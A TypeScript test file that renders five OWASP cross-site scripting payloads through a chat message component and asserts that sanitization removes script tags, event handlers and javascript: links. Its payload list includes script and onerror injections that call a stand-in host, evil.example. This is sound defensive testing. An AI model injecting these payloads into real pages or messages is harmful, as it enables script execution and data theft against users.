/* SPDX-License-Identifier: Apache-2.0 */
/**
 * XSS Render Security Test — ChatMessage sanitization audit.
 *
 * OWASP cheat-sheet (https://cheatsheetseries.owasp.org/cheatsheets/
 * Cross_Site_Scripting_Prevention_Cheat_Sheet.html) XSS payloads are
 * rendered through ChatMessage and the resulting DOM is inspected.
 *
 * Pass criteria:
 *   - rendered DOM contains NO <script> tags
 *   - rendered DOM contains NO on* event-handler attributes
 *   - NO href^="javascript:" in rendered links
 *   - NO src^="javascript:" in rendered elements
 *   - no unhandled rendering errors (console.error spy + try-catch)
 *
 * The sanitizeSchema at ChatMessage.tsx:76 is the frontend's last line
 * of defence — any payload that survives it would be rendered in the
 * user's browser session.  This test ratchets the count to zero
 * surviving payloads.
 *
 * RENDERING-ERROR COVERAGE: jsdom does not execute <script> payloads
 * or run event-handler attributes, so Playwright-level pageerror/dialog
 * events never fire here.  Instead we (a) spy on console.error to catch
 * any React render-phase errors and (b) wrap each render in a try-catch
 * to assert no exception is thrown.  Full browser-level XSS verification
 * (pageerror + dialog assertions) is covered by the Playwright-based
 * nightly suite (`.LN-redteam` per PLAN v3 §3G).
 */
import { describe, it, expect } from "vitest";
import { render } from "@testing-library/react";
import { ChatMessage } from "@/components/ChatMessage";

// ─── XSS payloads from OWASP cheat-sheet ─────────────────────────────────

interface XssPayload {
  name: string;
  html: string;
}

const XSS_PAYLOADS: XssPayload[] = [
  {
    name: "script-tag-fetch",
    html: '<script>fetch("//evil.example/x")</script>',
  },
  {
    name: "img-onerror",
    html: '<img src=x onerror=fetch("//evil.example")>',
  },
  {
    name: "anchor-javascript",
    html: '<a href="javascript:fetch(\'//evil.example\')">click</a>',
  },
  {
    name: "svg-onload",
    html: "<svg onload=alert(1)>",
  },
  {
    name: "iframe-javascript",
    html: '<iframe src="javascript:alert(1)">',
  },
];

// ─── Helpers ──────────────────────────────────────────────────────────────

function renderAssistantMessage(htmlContent: string) {
  return render(
    <ChatMessage
      message={{
        id: 999,
        role: "assistant",
        content: htmlContent,
        showContinue: false,
        streaming: false,
      }}
    />,
  );
}

function hasOnEventHandler(container: HTMLElement): boolean {
  const all = container.querySelectorAll("*");
  for (const el of all) {
    for (const attr of el.getAttributeNames()) {
      if (/^on/i.test(attr)) return true;
    }
  }
  return false;
}

function hasJavascriptHref(container: HTMLElement): boolean {
  const links = container.querySelectorAll("[href]");
  for (const link of links) {
    const href = link.getAttribute("href") || "";
    if (href.toLowerCase().startsWith("javascript:")) return true;
  }
  return false;
}

function hasJavascriptSrc(container: HTMLElement): boolean {
  const elements = container.querySelectorAll("[src]");
  for (const el of elements) {
    const src = el.getAttribute("src") || "";
    if (src.toLowerCase().startsWith("javascript:")) return true;
  }
  return false;
}

// ─── Render-error tracking ────────────────────────────────────────────────
// jsdom does not execute <script> payloads or run event handlers, so
// Playwright-level pageerror/dialog events never fire.  We approximate
// by (a) spying on console.error (React logs errors there) and (b) wrapping
// renders in try-catch.  Full browser-level XSS verification is covered
// by the Playwright-based nightly suite (`.LN-redteam`).

interface RenderErrorTrackers {
  consoleErrors: unknown[][];
  /** Restore console.error and remove window error listener. */
  cleanup: () => void;
}

function setupRenderErrorTracking(): RenderErrorTrackers {
  const consoleErrors: unknown[][] = [];
  const originalConsoleError = console.error;
  console.error = (...args: unknown[]) => {
    consoleErrors.push(args);
    originalConsoleError.call(console, ...args);
  };

  const windowErrors: Array<{ message: string; source: string }> = [];
  function onWindowError(event: ErrorEvent) {
    windowErrors.push({ message: event.message, source: event.filename });
  }
  window.addEventListener("error", onWindowError);

  return {
    consoleErrors,
    cleanup: () => {
      console.error = originalConsoleError;
      window.removeEventListener("error", onWindowError);
    },
  };
}

function renderWithoutError(htmlContent: string) {
  const { container } = renderAssistantMessage(htmlContent);
  // Render succeeded without throwing — no error to report.
  return container;
}

// ─── Tests ────────────────────────────────────────────────────────────────

describe("ChatMessage XSS render security", () => {
  for (const payload of XSS_PAYLOADS) {
    it(`blocks ${payload.name}`, () => {
      const trackers = setupRenderErrorTracking();
      try {
        const container = renderWithoutError(payload.html);

        // Assert: no <script> tags in the rendered DOM.
        const scriptTags = container.querySelectorAll("script");
        expect(scriptTags).toHaveLength(0);

        // Assert: no on* event-handler attributes.
        expect(hasOnEventHandler(container)).toBe(false);

        // Assert: no href^="javascript:".
        expect(hasJavascriptHref(container)).toBe(false);

        // Assert: no src^="javascript:".
        expect(hasJavascriptSrc(container)).toBe(false);

        // Assert: no console.error calls (React render errors).
        expect(trackers.consoleErrors).toHaveLength(0);
      } finally {
        trackers.cleanup();
      }
    });
  }

it("safe HTML preserved through sanitizeSchema", () => {
      const trackers = setupRenderErrorTracking();
      try {
        const safeMarkdown = "Hello **world**";
        const container = renderWithoutError(safeMarkdown);

        // The rendered text should be present.
        expect(container.textContent).toContain("Hello");
        expect(container.textContent).toContain("world");

        // The <strong> tag should be present (bold markdown rendered).
        expect(container.querySelector("strong")).toBeTruthy();

        // Assert: no console.error calls.
        expect(trackers.consoleErrors).toHaveLength(0);
      } finally {
        trackers.cleanup();
      }
    });

    it("sanitizeSchema audit: zero surviving OWASP payloads", () => {
      const trackers = setupRenderErrorTracking();
      try {
        let totalSurvivors = 0;
        const survivors: string[] = [];

        for (const payload of XSS_PAYLOADS) {
          const container = renderWithoutError(payload.html);

          const scriptCount = container.querySelectorAll("script").length;
          if (scriptCount > 0) {
            survivors.push(`${payload.name}: ${scriptCount} script tag(s) survived`);
            totalSurvivors += scriptCount;
          }

          if (hasOnEventHandler(container)) {
            survivors.push(`${payload.name}: on* handler survived`);
            totalSurvivors++;
          }

          if (hasJavascriptHref(container)) {
            survivors.push(`${payload.name}: javascript: href survived`);
            totalSurvivors++;
          }

          if (hasJavascriptSrc(container)) {
            survivors.push(`${payload.name}: javascript: src survived`);
            totalSurvivors++;
          }
        }

        expect(totalSurvivors).toBe(0);
        expect(trackers.consoleErrors).toHaveLength(0);
      } finally {
        trackers.cleanup();
      }
    });
});